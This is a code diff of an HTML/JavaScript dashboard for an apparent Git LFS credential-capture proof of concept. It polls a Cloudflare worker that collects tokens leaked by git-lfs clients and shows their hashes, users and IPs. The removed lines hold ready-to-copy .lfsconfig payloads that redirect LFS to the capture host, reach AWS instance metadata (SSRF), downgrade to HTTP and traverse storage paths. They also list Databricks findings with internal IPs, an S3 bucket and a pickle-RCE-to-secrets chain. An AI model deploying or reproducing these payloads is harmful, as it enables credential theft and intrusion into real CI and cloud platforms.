@@ -3,60 +3,93 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LFS Credential Capture Dashboard</title>
-  <link rel="stylesheet" href="styles.css">
+  <title>LFS Credential Capture — Secret Score</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; min-height: 100vh; }
+    .container { max-width: 1100px; margin: 0 auto; padding: 24px 16px; }
+    header { text-align: center; margin-bottom: 32px; }
+    h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 6px; }
+    .subtitle { color: #7d8590; font-size: 0.9rem; }
+    .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; margin-top: 8px; }
+
+    /* Score Section */
+    .score-section { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 32px; text-align: center; margin-bottom: 24px; }
+    .score-label { font-size: 0.85rem; color: #7d8590; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 12px; }
+    .score-value { font-size: 4rem; font-weight: 800; line-height: 1; margin-bottom: 8px; }
+    .score-value.critical { color: #f85149; }
+    .score-value.high { color: #ff7b72; }
+    .score-value.medium { color: #d29922; }
+    .score-value.low { color: #3fb950; }
+    .score-value.none { color: #7d8590; }
+    .score-detail { color: #7d8590; font-size: 0.85rem; }
+
+    /* Blocked URL */
+    .blocked-section { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px 24px; margin-bottom: 24px; }
+    .section-title { font-size: 0.85rem; color: #7d8590; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 14px; }
+    .blocked-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; }
+    .blocked-card { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px 16px; }
+    .blocked-label { font-size: 0.75rem; color: #7d8590; margin-bottom: 6px; }
+    .blocked-value { font-size: 1.1rem; font-weight: 600; }
+    .blocked-value.reachable { color: #f85149; }
+    .blocked-value.blocked { color: #3fb950; }
+    .blocked-check-btn { margin-top: 14px; background: #238636; color: #fff; border: none; padding: 8px 18px; border-radius: 6px; cursor: pointer; font-size: 0.85rem; }
+    .blocked-check-btn:hover { background: #2ea043; }
+
+    /* Tables */
+    .section { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px 24px; margin-bottom: 24px; }
+    table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+    th { text-align: left; color: #7d8590; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; padding: 8px 10px; border-bottom: 1px solid #30363d; }
+    td { padding: 10px 10px; border-bottom: 1px solid #21262d; color: #e6edf3; }
+    tr:last-child td { border-bottom: none; }
+    .empty { color: #484f58; text-align: center; padding: 24px; }
+    .hsh { font-family: 'Fira Code', 'Cascadia Code', monospace; font-size: 0.75rem; color: #8b949e; }
+    .src { color: #58a6ff; }
+    .sfx { color: #d29922; font-family: monospace; }
+    .ip { font-family: monospace; color: #79c0ff; }
+    .ts { color: #7d8590; font-size: 0.8rem; }
+    .badge-sev { display: inline-block; padding: 1px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: 600; }
+    .badge-sev.critical { background: #f8514922; color: #f85149; }
+    .badge-sev.high { background: #ff7b7222; color: #ff7b72; }
+
+    /* Raw Request */
+    .raw-section { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 20px 24px; margin-bottom: 24px; }
+    .raw-box { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 14px; font-family: 'Fira Code', 'Cascadia Code', monospace; font-size: 0.78rem; color: #8b949e; white-space: pre-wrap; word-break: break-all; min-height: 60px; }
+    .raw-empty { color: #484f58; font-style: italic; }
+
+    /* Status */
+    .status-bar { display: flex; align-items: center; gap: 8px; margin-top: 12px; justify-content: center; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #30363d; }
+    .status-dot.active { background: #3fb950; box-shadow: 0 0 6px #3fb95088; }
+    .status-text { font-size: 0.8rem; color: #7d8590; }
+  </style>
 </head>
 <body>
 <div class="container">
   <header>
-    <h1>LFS Credential Capture</h1>
-    <p class="subtitle">Git LFS request monitor — Cloudflare Pages PoC</p>
-    <div class="azure-badge" id="azureBadge">AZURE ENV</div>
+    <h1>Git LFS Credential Capture</h1>
+    <p class="subtitle">Secret Score Dashboard — credentials never exposed, only hashed</p>
+    <div class="badge">PUBLIC</div>
     <div class="status-bar">
-      <span class="status-indicator" id="statusDot"></span>
-      <span id="statusText">Waiting for connections...</span>
+      <div class="status-dot" id="statusDot"></div>
+      <span class="status-text" id="statusText">Waiting for connections...</span>
     </div>
   </header>
 
-  <div class="stats-grid">
-    <div class="stat-card">
-      <div class="stat-value" id="totalAccesses">0</div>
-      <div class="stat-label">Total Accesses</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-value" id="uniqueTokens">0</div>
-      <div class="stat-label">Unique Tokens</div>
-    </div>
-    <div class="stat-card highlight">
-      <div class="stat-value" id="lastSuffix">---</div>
-      <div class="stat-label">Last Token Suffix</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-value" id="lastAccess">---</div>
-      <div class="stat-label">Last Access</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-value" id="ghCount">0</div>
-      <div class="stat-label">GitHub Sources</div>
-    </div>
-  <div class="stat-card">
-    <div class="stat-value" id="glCount">0</div>
-    <div class="stat-label">GitLab Sources</div>
+  <!-- Secret Score -->
+  <div class="score-section">
+    <div class="score-label">Secret Score</div>
+    <div class="score-value none" id="scoreValue">---</div>
+    <div class="score-detail" id="scoreDetail">Polling worker API...</div>
   </div>
-  <div class="stat-card highlight">
-    <div class="stat-value" id="dtbCount">0</div>
-    <div class="stat-label">Databricks Sources</div>
-  </div>
-</div>
 
-  <!-- Blocked URL Monitoring Section -->
-  <div class="section">
-    <h2>Blocked URL Monitor — dev.graco.com</h2>
-    <p class="section-desc">Monitoring if requests to <code>dev.graco.com</code> (Azure-blocked) reach destination via LFS .lfsconfig redirect</p>
+  <!-- Blocked URL Monitor -->
+  <div class="blocked-section">
+    <div class="section-title">Blocked URL Monitor — dev.graco.com</div>
     <div class="blocked-grid">
       <div class="blocked-card">
         <div class="blocked-label">Reachable from CF Edge</div>
-        <div class="blocked-value" id="blockedReachable">---</div>
+        <div class="blocked-value blocked" id="blockedReachable">---</div>
       </div>
       <div class="blocked-card">
         <div class="blocked-label">Last Check</div>
@@ -71,184 +104,54 @@
         <div class="blocked-value" id="blockedResponseTime">---</div>
       </div>
     </div>
-    <div class="blocked-history">
-      <h3>Check History</h3>
-      <table>
-        <thead>
-          <tr><th>Timestamp</th><th>Reachable</th><th>Status</th><th>Time (ms)</th><th>Error</th></tr>
-        </thead>
-        <tbody id="blockedBody">
-          <tr><td colspan="5" class="empty">No checks performed</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <button class="btn" onclick="checkBlocked()">Check Now</button>
+    <button class="blocked-check-btn" onclick="checkBlocked()">Check Now</button>
   </div>
 
+  <!-- Recent Accesses -->
   <div class="section">
-    <h2>Recent Accesses</h2>
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th><th>Timestamp</th><th>IP</th><th>Source</th><th>Suffix</th>
-            <th>SHA-256 Hash</th><th>User</th><th>Method</th><th>Path</th>
-          </tr>
-        </thead>
-        <tbody id="accessBody">
-          <tr><td colspan="9" class="empty">No accesses recorded</td></tr>
-        </tbody>
-      </table>
+    <div class="section-title">Recent Accesses</div>
+    <div style="overflow-x:auto;">
+    <table>
+      <thead>
+        <tr><th>#</th><th>Timestamp</th><th>IP</th><th>Source</th><th>Suffix</th><th>User</th><th>Method</th><th>Path</th></tr>
+      </thead>
+      <tbody id="accessBody">
+        <tr><td colspan="8" class="empty">No accesses recorded</td></tr>
+      </tbody>
+    </table>
     </div>
   </div>
 
+  <!-- Captured Tokens -->
   <div class="section">
-    <h2>Captured Tokens</h2>
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>SHA-256 Hash</th><th>Suffix</th><th>User</th><th>Auth Type</th>
-            <th>Source</th><th>First Seen</th><th>Last Seen</th><th>Count</th>
-          </tr>
-        </thead>
-        <tbody id="tokenBody">
-          <tr><td colspan="8" class="empty">No tokens captured</td></tr>
-        </tbody>
-      </table>
+    <div class="section-title">Captured Tokens</div>
+    <div style="overflow-x:auto;">
+    <table>
+      <thead>
+        <tr><th>SHA-256 Hash</th><th>Suffix</th><th>User</th><th>Source</th><th>First Seen</th><th>Last Seen</th><th>Count</th></tr>
+      </thead>
+      <tbody id="tokenBody">
+        <tr><td colspan="7" class="empty">No tokens captured</td></tr>
+      </tbody>
+    </table>
     </div>
   </div>
 
-  <div class="section">
-    <h2>.lfsconfig for Testing</h2>
-    <div class="config-box">
-      <h3>V1 — Credential Capture (GitHub/GitLab/Local)</h3>
-      <pre id="lfsconfigV1">[lfs]
- url = https://lfs-capture.everton-win32.workers.dev</pre>
-      <button class="btn" onclick="copyConfig('v1')">Copy V1</button>
-    </div>
-    <div class="config-box" style="margin-top:12px">
-      <h3>V2 — Databricks Serverless (fetchexclude=*)</h3>
-      <pre id="lfsconfigV2">[lfs]
- url = https://lfs-capture.everton-win32.workers.dev
- fetchexclude = *</pre>
-      <button class="btn" onclick="copyConfig('v2')">Copy V2</button>
-    </div>
-    <div class="config-box" style="margin-top:12px">
-      <h3>V3 — SSRF to AWS IMDS (169.254.169.254)</h3>
-      <pre id="lfsconfigV3">[lfs]
- url = http://169.254.169.254/latest/meta-data/</pre>
-      <button class="btn" onclick="copyConfig('v3')">Copy V3</button>
-    </div>
-    <div class="config-box" style="margin-top:12px">
-      <h3>V4 — Path Traversal (lfs.storage)</h3>
-      <pre id="lfsconfigV4">[lfs]
- url = https://lfs-capture.everton-win32.workers.dev
- storage = /tmp/lfs-lab-traversal</pre>
-      <button class="btn" onclick="copyConfig('v4')">Copy V4</button>
-    </div>
-    <div class="config-box" style="margin-top:12px">
-      <h3>V5 — Azure SSRF (dev.graco.com)</h3>
-      <pre id="lfsconfigV5">[lfs]
- url = https://dev.graco.com</pre>
-      <button class="btn" onclick="copyConfig('v5')">Copy V5</button>
-    </div>
-    <div class="config-box" style="margin-top:12px">
-      <h3>V6 — HTTP Downgrade (credential leak)</h3>
-      <pre id="lfsconfigV6">[lfs]
- url = http://lfs-capture.everton-win32.workers.dev</pre>
-      <button class="btn" onclick="copyConfig('v6')">Copy V6</button>
-    </div>
-  </div>
-
-  <!-- Databricks Serverless Findings -->
-  <div class="section" id="databricksSection">
-    <h2>Databricks Serverless Findings</h2>
-    <p class="section-desc">Confirmed vulnerabilities from Databricks Serverless compute — LFS config chain attacks on shared Kubernetes infrastructure</p>
-    <div class="vuln-grid" id="databricksVulns">
-      <div class="vuln-card critical">
-        <div class="vuln-id">DTB-6</div>
-        <div class="vuln-name">Secrets Escalation (dbutils.secrets)</div>
-        <div class="vuln-cvss">CVSS 8.2</div>
-        <div class="vuln-detail">RCE via LFS payload → <code>dbutils.secrets.get()</code> fully accessible from driver process. Canary hash: <span class="hsh">1d5fd151...9af5</span> (len 19, prefix CANA...)</div>
-        <div class="vuln-variation">PoC: V2 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v2-databricks-lfsconfig">.lfsconfig</a></div>
-      </div>
-      <div class="vuln-card high">
-        <div class="vuln-id">DTB-2</div>
-        <div class="vuln-name">Config Chain Redirect</div>
-        <div class="vuln-cvss">CVSS 7.5</div>
-        <div class="vuln-detail">.lfsconfig in repo overrides global LFS settings — redirects batch API to attacker-controlled endpoint</div>
-        <div class="vuln-variation">PoC: V1-V6 — <a href="https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig">.lfsconfig</a></div>
-      </div>
-      <div class="vuln-card high">
-        <div class="vuln-id">DTB-3</div>
-        <div class="vuln-name">Consumer Exec (RCE via LFS payload)</div>
-        <div class="vuln-cvss">CVSS 7.0</div>
-        <div class="vuln-detail">Pickle/binary payloads downloaded via LFS are executed by consumer notebooks without validation</div>
-        <div class="vuln-variation">PoC: V1 — <a href="https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig">.lfsconfig</a></div>
-      </div>
-      <div class="vuln-card medium">
-        <div class="vuln-id">DTB-7</div>
-        <div class="vuln-name">E2E Chain (Config→RCE→Secrets)</div>
-        <div class="vuln-cvss">CVSS 6.5</div>
-        <div class="vuln-detail">Full chain: .lfsconfig redirect → pickle RCE → dbutils.secrets extraction. DNS resolution blocked in Serverless but chain completes with reachable endpoint.</div>
-        <div class="vuln-variation">PoC: V2 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v2-databricks-lfsconfig">.lfsconfig</a></div>
-      </div>
-      <div class="vuln-card medium">
-        <div class="vuln-id">DTB-5</div>
-        <div class="vuln-name">SSRF to AWS IMDS</div>
-        <div class="vuln-cvss">CVSS 5.3</div>
-        <div class="vuln-detail">IP 169.254.169.254 TCP-routable from Serverless pods. HTTP blocked (connection refused) — defense-in-depth works. S3 bucket exposed: <code>s3://databricks-prewarm-datasets-prod-us-west-2</code></div>
-        <div class="vuln-variation">PoC: V3 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v3-ssrf-imds-lfsconfig">.lfsconfig</a></div>
-      </div>
-    </div>
-    <div class="databricks-infra">
-      <h3>Serverless Infrastructure Details</h3>
-      <table>
-        <thead><tr><th>Property</th><th>Value</th></tr></thead>
-        <tbody>
-          <tr><td>Container Type</td><td>Kubernetes pod (burstable)</td></tr>
-          <tr><td>Instance Type</td><td>serverless-driver-4cpu-low-mem-aws</td></tr>
-          <tr><td>Internal IP</td><td class="ip">192.168.210.3</td></tr>
-          <tr><td>IMDS IP</td><td class="ip">169.254.169.254</td><td>TCP routable, HTTP blocked</td></tr>
-          <tr><td>S3 Bucket</td><td><code>databricks-prewarm-datasets-prod-us-west-2</code></td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- Vulnerability Atlas -->
-  <div class="section" id="atlasSection">
-    <h2>Vulnerability Atlas — All Confirmed Findings</h2>
-    <p class="section-desc">Cross-platform LFS attack surface mapped to GitHub Pages PoC variations — <button class="btn" onclick="fetchVulns()">Refresh from Worker API</button></p>
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr><th>ID</th><th>Name</th><th>CVSS</th><th>Severity</th><th>Variation</th><th>Platforms</th><th>PoC URL</th></tr>
-        </thead>
-        <tbody id="atlasBody">
-          <tr><td colspan="7" class="empty">Loading vulnerability atlas...</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <div class="section">
-    <h2>Risk Analysis</h2>
-    <div id="riskBox">Waiting for data...</div>
+  <!-- Last Raw Request -->
+  <div class="raw-section">
+    <div class="section-title">Last Raw Request</div>
+    <div class="raw-box" id="rawBox"><span class="raw-empty">No raw request captured yet</span></div>
   </div>
 </div>
 
 <script>
-const DB_KEY = 'lfs_capture_v3';
+const DB_KEY = 'lfs_capture_v4';
 const WORKER_API = 'https://lfs-capture.everton-win32.workers.dev/api/stats?key=cloudflare';
 const BLOCKED_API = 'https://lfs-capture.everton-win32.workers.dev/api/blocked?key=cloudflare';
-const VULNS_API = 'https://lfs-capture.everton-win32.workers.dev/api/vulnerabilities?key=cloudflare';
-const AZURE_FLAG = true;
 
 function loadDB() {
-  try { return JSON.parse(localStorage.getItem(DB_KEY)) || { accesses: [], tokens: {}, total: 0, blockedChecks: [] }; }
-  catch(e) { return { accesses: [], tokens: {}, total: 0, blockedChecks: [] }; }
+  try { return JSON.parse(localStorage.getItem(DB_KEY)) || { accesses: [], tokens: {}, total: 0, blockedChecks: [], lastRaw: null }; }
+  catch(e) { return { accesses: [], tokens: {}, total: 0, blockedChecks: [], lastRaw: null }; }
 }
 function saveDB(db) {
   try { localStorage.setItem(DB_KEY, JSON.stringify(db)); } catch(e) {}
@@ -271,37 +174,11 @@ function fmtTs(ts) {
   try { return new Date(ts).toLocaleString('en-US'); } catch(e) { return ts; }
 }
 
-async function recordAccess(data) {
-  const db = loadDB();
-  const id = db.total + 1;
-  let tokenStr = data.token || data.auth || '';
-  let tokenHash = 'N/A', tokenSuffix = 'N/A';
-  if (tokenStr) {
-    tokenHash = await sha256(tokenStr);
-    tokenSuffix = suffix(tokenStr);
-  }
-  const record = {
-    id, timestamp: new Date().toISOString(),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ip: data.ip || 'N/A', method: data.method || 'GET',
-    path: data.path || '/', userAgent: navigator.userAgent,
-    tokenHash, tokenSuffix, user: data.user || 'N/A',
-    source: data.source || 'unknown', authType: data.authType || 'unknown',
-    azureFlag: AZURE_FLAG,
-  };
-  db.accesses.unshift(record);
-  if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
-  db.total++;
-  if (tokenHash !== 'N/A') {
-    if (!db.tokens[tokenHash]) {
-      db.tokens[tokenHash] = { suffix: tokenSuffix, user: data.user || 'N/A', authType: data.authType || 'unknown', source: data.source || 'unknown', firstSeen: record.timestamp, lastSeen: record.timestamp, count: 1 };
-    } else {
-      db.tokens[tokenHash].count++;
-      db.tokens[tokenHash].lastSeen = record.timestamp;
-    }
-  }
-  saveDB(db);
-  refreshDashboard();
+function calcScore(total, tokenCount) {
+  if (tokenCount > 0) return { val: total, cls: 'critical', txt: tokenCount + ' token(s) captured — credentials exposed via .lfsconfig redirect' };
+  if (total >= 5) return { val: total, cls: 'high', txt: total + ' accesses — multiple LFS requests intercepted' };
+  if (total >= 1) return { val: total, cls: 'medium', txt: total + ' access(es) recorded' };
+  return { val: 0, cls: 'none', txt: 'No captures yet' };
 }
 
 async function fetchWorkerData() {
@@ -309,30 +186,55 @@ async function fetchWorkerData() {
     const r = await fetch(WORKER_API);
     const d = await r.json();
     const db = loadDB();
+    const prevTotal = db.total;
+
     for (const a of (d.recentAccesses || [])) {
       const exists = db.accesses.some(x => x.id === a.id);
       if (!exists) {
         db.accesses.unshift({
-          id: a.id || (db.total + 1), timestamp: a.timestamp,
-          timezone: 'UTC', ip: a.ip || 'N/A',
-          method: a.operation || 'LFS_BATCH', path: '/objects/batch',
-          userAgent: a.user_agent || 'git-lfs (worker)',
-          tokenHash: a.token_hash || 'N/A', tokenSuffix: a.token_suffix || 'N/A',
-          user: a.user || 'N/A', source: a.source || 'unknown',
-          authType: a.auth_type || 'unknown', azureFlag: AZURE_FLAG,
+          id: a.id || (db.total + 1),
+          timestamp: a.timestamp,
+          ip: a.ip || 'N/A',
+          method: a.operation || 'LFS_BATCH',
+          path: '/objects/batch',
+          userAgent: a.user_agent || 'git-lfs',
+          tokenHash: a.token_hash || 'N/A',
+          tokenSuffix: a.token_suffix || 'N/A',
+          user: a.user || 'N/A',
+          source: a.source || 'unknown',
+          authType: a.auth_type || 'unknown',
         });
         db.total++;
       }
     }
+
     for (const t of (d.tokens || [])) {
       if (t.hash && !db.tokens[t.hash]) {
-        db.tokens[t.hash] = { suffix: t.suffix, user: t.user, authType: t.auth_type || 'unknown', source: t.source || 'unknown', firstSeen: t.first_seen, lastSeen: t.last_seen, count: t.count };
+        db.tokens[t.hash] = {
+          suffix: t.suffix,
+          user: t.user,
+          authType: t.auth_type || 'unknown',
+          source: t.source || 'unknown',
+          firstSeen: t.first_seen,
+          lastSeen: t.last_seen,
+          count: t.count,
+        };
       }
     }
+
+    // Update last raw request from most recent access
+    if (d.recentAccesses && d.recentAccesses.length > 0) {
+      const latest = d.recentAccesses[0];
+      db.lastRaw = latest.raw || null;
+    }
+
     if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
     saveDB(db);
     refreshDashboard();
-  } catch(e) { console.warn('Worker fetch failed:', e); }
+  } catch(e) {
+    console.warn('Worker fetch failed:', e);
+    refreshDashboard();
+  }
 }
 
 async function checkBlocked() {
@@ -346,14 +248,11 @@ async function checkBlocked() {
     saveDB(db);
     refreshBlocked(d);
   } catch(e) {
-    console.warn('Blocked check failed:', e);
     refreshBlocked({ reachable: false, error: e.message, timestamp: new Date().toISOString() });
   }
 }
 
 function refreshBlocked(latest) {
-  const db = loadDB();
-  const checks = db.blockedChecks || [];
   if (latest) {
     document.getElementById('blockedReachable').textContent = latest.reachable ? 'YES' : 'NO';
     document.getElementById('blockedReachable').className = 'blocked-value ' + (latest.reachable ? 'reachable' : 'blocked');
@@ -361,153 +260,81 @@ function refreshBlocked(latest) {
     document.getElementById('blockedStatusCode').textContent = latest.status_code || 'N/A';
     document.getElementById('blockedResponseTime').textContent = latest.response_time_ms ? latest.response_time_ms + 'ms' : 'N/A';
   }
-  const tbody = document.getElementById('blockedBody');
-  if (checks.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="5" class="empty">No checks performed</td></tr>';
-  } else {
-    tbody.innerHTML = checks.slice(0, 20).map(c =>
-      '<tr><td class="ts">' + fmtTs(c.timestamp) + '</td>' +
-      '<td class="' + (c.reachable ? 'reachable' : 'blocked') + '">' + (c.reachable ? 'YES' : 'NO') + '</td>' +
-      '<td>' + (c.status_code || 'N/A') + '</td>' +
-      '<td>' + (c.response_time_ms ? c.response_time_ms + 'ms' : 'N/A') + '</td>' +
-      '<td>' + (c.error || '—') + '</td></tr>'
-    ).join('');
-  }
 }
 
 function refreshDashboard() {
   const db = loadDB();
   const tokens = Object.entries(db.tokens);
   const last = db.accesses[0];
-  let ghCount = 0, glCount = 0, dtbCount = 0;
-  db.accesses.forEach(a => {
-    if (a.source && a.source.includes('github')) ghCount++;
-    if (a.source && a.source.includes('gitlab')) glCount++;
-    if (a.source && a.source.includes('databricks')) dtbCount++;
-  });
+  const score = calcScore(db.total, tokens.length);
 
-  document.getElementById('totalAccesses').textContent = db.total;
-  document.getElementById('uniqueTokens').textContent = tokens.length;
-  document.getElementById('lastSuffix').textContent = last ? last.tokenSuffix : '---';
-  document.getElementById('lastAccess').textContent = last ? fmtTs(last.timestamp) : '---';
-  document.getElementById('ghCount').textContent = ghCount;
-  document.getElementById('glCount').textContent = glCount;
-  document.getElementById('dtbCount').textContent = dtbCount;
+  // Score
+  const scoreEl = document.getElementById('scoreValue');
+  scoreEl.textContent = score.val;
+  scoreEl.className = 'score-value ' + score.cls;
+  document.getElementById('scoreDetail').textContent = score.txt;
 
+  // Status
   const dot = document.getElementById('statusDot');
   const stxt = document.getElementById('statusText');
-  if (db.total > 0) { dot.classList.add('active'); stxt.textContent = db.total + ' connection(s) captured'; }
-  else { dot.classList.remove('active'); stxt.textContent = 'Waiting for connections...'; }
+  if (db.total > 0) {
+    dot.classList.add('active');
+    stxt.textContent = db.total + ' connection(s) captured';
+  } else {
+    dot.classList.remove('active');
+    stxt.textContent = 'Waiting for connections...';
+  }
 
+  // Recent accesses
   const abody = document.getElementById('accessBody');
   if (db.accesses.length === 0) {
-    abody.innerHTML = '<tr><td colspan="9" class="empty">No accesses recorded</td></tr>';
+    abody.innerHTML = '<tr><td colspan="8" class="empty">No accesses recorded</td></tr>';
   } else {
     abody.innerHTML = db.accesses.slice(0, 50).map(a =>
-      '<tr><td>' + a.id + '</td><td class="ts">' + fmtTs(a.timestamp) + '</td>' +
+      '<tr><td>' + a.id + '</td>' +
+      '<td class="ts">' + fmtTs(a.timestamp) + '</td>' +
       '<td class="ip">' + a.ip + '</td>' +
       '<td class="src">' + (a.source || 'unknown') + '</td>' +
       '<td class="sfx">' + a.tokenSuffix + '</td>' +
-      '<td class="hsh" title="' + a.tokenHash + '">' + (a.tokenHash !== 'N/A' ? a.tokenHash.substring(0,8) + '...' + a.tokenHash.slice(-8) : 'N/A') + '</td>' +
-      '<td>' + a.user + '</td><td>' + a.method + '</td><td>' + a.path + '</td></tr>'
+      '<td>' + a.user + '</td>' +
+      '<td>' + a.method + '</td>' +
+      '<td>' + a.path + '</td></tr>'
     ).join('');
   }
 
+  // Captured tokens
   const tbody = document.getElementById('tokenBody');
   if (tokens.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="8" class="empty">No tokens captured</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="7" class="empty">No tokens captured</td></tr>';
   } else {
     tbody.innerHTML = tokens.map(function(e) {
       var h = e[0], i = e[1];
       return '<tr><td class="hsh" title="' + h + '">' + h.substring(0,8) + '...' + h.slice(-8) + '</td>' +
-        '<td class="sfx">' + i.suffix + '</td><td>' + i.user + '</td>' +
-        '<td>' + (i.authType || 'N/A') + '</td><td>' + (i.source || 'N/A') + '</td>' +
-        '<td class="ts">' + fmtTs(i.firstSeen) + '</td><td class="ts">' + fmtTs(i.lastSeen) + '</td>' +
+        '<td class="sfx">' + i.suffix + '</td>' +
+        '<td>' + i.user + '</td>' +
+        '<td class="src">' + (i.source || 'N/A') + '</td>' +
+        '<td class="ts">' + fmtTs(i.firstSeen) + '</td>' +
+        '<td class="ts">' + fmtTs(i.lastSeen) + '</td>' +
         '<td>' + i.count + '</td></tr>';
     }).join('');
   }
 
-  const riskBox = document.getElementById('riskBox');
-  if (db.total === 0) { riskBox.innerHTML = '<p>Waiting for data...</p>'; return; }
-  var risks = [];
-  if (tokens.length > 0) risks.push({ s: 'critical', t: tokens.length + ' token(s) captured — credentials exposed via .lfsconfig redirect' });
-  if (db.total > 5) risks.push({ s: 'high', t: db.total + ' accesses — multiple LFS requests intercepted' });
-  if (ghCount > 0) risks.push({ s: 'high', t: ghCount + ' request(s) from GitHub Actions CI' });
-  if (glCount > 0) risks.push({ s: 'high', t: glCount + ' request(s) from GitLab CI' });
-  if (dtbCount > 0) risks.push({ s: 'critical', t: dtbCount + ' request(s) from Databricks Serverless — credentials leaked via .lfsconfig redirect on shared K8s infra' });
-  var checks = db.blockedChecks || [];
-  if (checks.length > 0 && checks[0].reachable) risks.push({ s: 'critical', t: 'dev.graco.com is REACHABLE — Azure block bypassed via LFS redirect' });
-  riskBox.innerHTML = risks.map(function(r) {
-    return '<div class="risk-row"><span>' + r.t + '</span><span class="badge ' + r.s + '">' + r.s.toUpperCase() + '</span></div>';
-  }).join('');
+  // Last raw request
+  const rawBox = document.getElementById('rawBox');
+  if (db.lastRaw) {
+    rawBox.innerHTML = db.lastRaw;
+  } else {
+    rawBox.innerHTML = '<span class="raw-empty">No raw request captured yet</span>';
+  }
 }
-
-  function copyConfig(variant) {
-    var configs = {
-      v1: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev',
-      v2: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev\n fetchexclude = *',
-      v3: '[lfs]\n url = http://169.254.169.254/latest/meta-data/',
-      v4: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev\n storage = /tmp/lfs-lab-traversal',
-      v5: '[lfs]\n url = https://dev.graco.com',
-      v6: '[lfs]\n url = http://lfs-capture.everton-win32.workers.dev',
-    };
-    var labels = { v1:'V1', v2:'V2', v3:'V3', v4:'V4', v5:'V5', v6:'V6' };
-    var text = configs[variant] || configs.v1;
-    navigator.clipboard.writeText(text);
-    event.target.textContent = 'Copied!';
-    setTimeout(function() { event.target.textContent = 'Copy ' + (labels[variant] || 'V1'); }, 2000);
-  }
-
-  async function fetchVulns() {
-    try {
-      var r = await fetch(VULNS_API);
-      var d = await r.json();
-      var vulns = d.all || [];
-      var tbody = document.getElementById('atlasBody');
-      if (vulns.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="7" class="empty">No vulnerabilities found</td></tr>';
-        return;
-      }
-      tbody.innerHTML = vulns.map(function(v) {
-        var sevClass = v.severity === 'critical' ? 'critical' : v.severity === 'high' ? 'high' : v.severity === 'medium' ? 'medium' : 'low';
-        return '<tr>' +
-          '<td class="sfx">' + v.id + '</td>' +
-          '<td>' + v.name + '</td>' +
-          '<td class="sfx">' + v.cvss + '</td>' +
-          '<td><span class="badge ' + sevClass + '">' + v.severity.toUpperCase() + '</span></td>' +
-          '<td>' + v.variation + '</td>' +
-          '<td>' + v.platforms.join(', ') + '</td>' +
-          '<td><a href="' + v.github_pages_url + '" target="_blank" class="src">' + v.github_pages_url.replace('https://graomelo.github.io/lfs-github-pages-poc/', '') + '</a></td>' +
-          '</tr>';
-      }).join('');
-    } catch(e) {
-      console.warn('Vulns fetch failed:', e);
-      document.getElementById('atlasBody').innerHTML = '<tr><td colspan="7" class="empty">Failed to load — worker unreachable</td></tr>';
-    }
-  }
 
 document.addEventListener('DOMContentLoaded', function() {
   refreshDashboard();
   refreshBlocked();
   fetchWorkerData();
   checkBlocked();
-  fetchVulns();
   setInterval(fetchWorkerData, 15000);
   setInterval(checkBlocked, 60000);
-  setInterval(fetchVulns, 120000);
-
-  var params = new URLSearchParams(window.location.search);
-  if (params.has('token') || params.has('auth') || params.has('credential')) {
-    recordAccess({
-      token: params.get('token') || params.get('auth') || params.get('credential'),
-      user: params.get('user') || 'N/A',
-      ip: params.get('ip') || 'N/A',
-      method: params.get('method') || 'GET',
-      path: window.location.pathname,
-      source: params.get('source') || 'unknown',
-      authType: params.get('auth_type') || 'unknown',
-    });
-  }
 });
 </script>
 </body>
